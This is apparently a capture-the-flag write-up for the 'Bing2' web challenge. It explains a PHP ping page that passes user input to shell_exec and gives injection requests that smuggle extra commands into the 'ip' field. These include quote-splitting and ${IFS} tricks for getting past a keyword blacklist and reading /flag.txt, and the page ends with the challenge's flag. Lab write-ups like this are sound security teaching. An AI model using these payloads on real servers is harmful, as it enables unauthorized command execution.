# Bing2

Bing2 is a **web challenge** that is also a **white box testing** challenge, i.e. we have the full source code. This means that we can run the code for the challenge locally on our own machine. This can help a lot since we can put in our own debug code and make shortcuts to understand the code and its vulnerabilities better.

We get the following files:

``` bash
└─$ tree                       
.
├── docker-compose.yml
├── Dockerfile
├── flag.txt
└── src
    ├── bing.php
    └── index.html

2 directories, 5 files
```

From this we can see that **Docker** is used and there is the `flag.txt` (which is fake) and also the source code with a PHP file (`bing.php`) and a HTML file (`index.html`). 
## Settings up docker container
*(this section is optional, but can be helpful to understand how the internals of this challenge works)*

We can easily run this on our own system (if you have Docker installed) by running:
``` bash
sudo docker-compose build
sudo docker-compose up
```

In the docker-compose.yml file we can see this code in the end

``` yaml
    ports:
      - 1337:80
```
Which means that the port 80 inside the docker container, will be connected to external port 1337 on the container. This means that we can browse to http://localhost:1337 to view the web site inside the docker container.

![Bing2_image1](https://github.com/user-attachments/assets/929f021f-d90f-4543-92e2-3de0ebc95bb4)

## The source files
When we study the `index.html` file, we can see it is a static HTML page that does not have any real logic. No JavaScript, no links, nothing that can help us get the flag.

The other file on the other hand, `bing.php`, seems to be more interesting. It contains a lot of PHP code. The first row

``` php
if (isset($_POST['Submit'])) 
```

checks that the `Submit`-parameter is set in a **POST** request. If not, nothing will be returned from the PHP code. That means, if you browse to http://localhost:1337/bing.php you will get a blank page, since that is a **GET** request.

We need to **POST** a request to this page instead. This cannot be easily done with a browser, so we need another tool. More on that later. Let's check the rest of the code.

The next line assumes that we have **POST**ed a request and reads a parameter called `ip` from the request.
```
$target = trim($_REQUEST['ip']);
```

Next we have a long array called `$substitions` that contains a lot of **bash** commands and other characters that will be replaced by an empty string in the function `str_replace`.  

``` php
$target = str_replace(array_keys($substitutions), $substitutions, $target);
```

So we can make a guess that there is some kind of filter that will remove forbidden commands and characters.

The `$target` variable is then used (depending on which operating system you are running on) to make a system call with

``` php
$cmd = shell_exec('ping  -c 4 ' . (string)$target);
```

And the response from the `shell_exec` is stored in the `$cmd` variable and printed out on the web page with `echo`.

Ok, so from what we can understand, `bing.php` is a web function that will ping the target `ip` that you have posted to the page, and reply the response.
## Making a POST request
There are several ways to make POST requests, with cURL, Powershell and also from the devtools in your browser. But here we will use Burp Suite (Community Edition), since it will automatically help us set up the base request code.

If you have set up Burp and your browser correctly, letting the traffic flow through the Burp as a Proxy you catch the GET request for http://localhost:1337/bing.php.

![Bing2_image2](https://github.com/user-attachments/assets/c40638a6-2c0b-4303-b9c6-f67454ba4cfb)

If you right click on the GET request (or press CTRL-R), you can send this request to Repeater, where we can modify the request to fit our needs.

In the Repeater pane we can see this request code
``` http
GET /bing.php HTTP/1.1
Host: localhost:1337
```
The rest of the request code, below these rows, are not necessary in this challenge an can be removed.

Now we need to change this to a POST request and the required parameters and we also need to tell the server that the parameters is for a form request:

``` http
POST /bing.php HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

Submit=1&ip=127.0.0.1
```
*Make sure there is not more than one line between `Content-Length` row and the POST parameters.* 

But only an empty body in the response is returned?
## Ping not installed in container???
The above request should return the result of the `ping` request, and it works on the real service. But not on our local docker container.

The organizers have failed (or ignored by purpose) to include the `ping` command in the container. This complicates things a bit. So what happens in our local container is a silent fail of the ping command.

We can see this locally by adding `2>&1` to the end of the `shell_exec` call. What this does is to redirect error output to standard output so that also errors are returned. It should look like this:
```php
$cmd = shell_exec('ping  -c 4 ' . (string)$target . ' 2>&1');
```

Before we can use it we need  to stop the docker from running (press CTRL-C twice) and then build and run it again.
``` bash
sudo docker-compose build
sudo docker-compose up
```

And if we send the POST request above again, we will get this response:

``` http
HTTP/1.1 200 OK
Date: Mon, 29 Jul 2024 12:11:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 23
Content-Type: text/html; charset=UTF-8

sh: 1: ping: not found
```

Sending the request to the real service gives us:

``` http
HTTP/2 200 OK
Date: Mon, 29 Jul 2024 12:37:23 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 425
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.164 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.236 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.157 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.176 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 0.157/0.183/0.236/0.031 ms
```

So now we understand the differences and can go on. The missing `ping` is not a great issue and we can continue the challenge locally anyway.
## Command injection

Ok, using `shell_exec` is usually bad practice since it may allow for **command injection**, meaning that a user/hacker can inject (bash) commands from the outside that will execute on the server.

How can a command injection be done? The easiest way is just by adding more commands to the end of the string that is sent to the vulnerable service. Just separate the command with `;`. In our we can for example add `;uname` to the IP address we send.

``` http
POST /bing.php HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

Submit=1&ip=127.0.0.1;uname
```

The command `uname` works, since it is not in the blacklist. And the request will return
``` http
HTTP/1.1 200 OK
Date: Mon, 29 Jul 2024 12:21:23 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 6
Content-Type: text/html; charset=UTF-8

Linux
```

And we have shown that we can inject commands.
## Bypassing the blacklist
Alright, we now know that the `bing.php` is vulnerable to command injection we need to find a way to get the flag. We know that it is located at `/flag.txt` and one way to read it would be with the `cat` command. So our first approach is to do this call
``` bash
cat /flag.txt
```
But both the words `cat` and `flag` and also whitespace are in the blacklist, so we cannot use them directly.

### Bypass with quotes

But there are some tricks to bypass these limits. We can bypass filters using single or double quotes, see Payload all the things https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-single-quote

We can test this first by running a single command without whitespace that is in the blacklist, like `whoami` written using single quotes.

``` http
POST /bing.php HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

Submit=1&ip=127.0.0.1;wh'o'ami
```

And it returns

``` http
HTTP/1.1 200 OK
Date: Mon, 29 Jul 2024 12:29:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 9
Content-Type: text/html; charset=UTF-8

www-data
```

Yes, this technique works! 

### Bypass without space

Whitespace is the next challenge and here Payload all the things can also help us: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

We replace the whitespace with `${IFS}`.

Combining these bypasses together with `cat` and `flag.txt` we get the following request

``` http
POST /bing.php HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

Submit=1&ip=127.0.0.1;c'a't${IFS}/f'l'ag.txt
```

And it will return the (fake) flag

``` http
HTTP/1.1 200 OK
Date: Mon, 29 Jul 2024 12:33:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 10
Content-Type: text/html; charset=UTF-8

dead{test}
```

Now we can test this on the real challenge service:

``` http
POST /bing.php HTTP/2
Host: 7f97d79d0808e3ff896df13b.deadsec.quest
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

Submit=1&ip=127.0.0.1;c'a't${IFS}/f'l'ag.txt
```

And it will return the ping result and the flag!!!

``` http
HTTP/2 200 OK
Date: Mon, 29 Jul 2024 12:36:11 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 468
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.226 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.170 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.140 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.142 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 0.140/0.169/0.226/0.034 ms
DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}
```

The flag is

``` ctf_flag
DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}
```
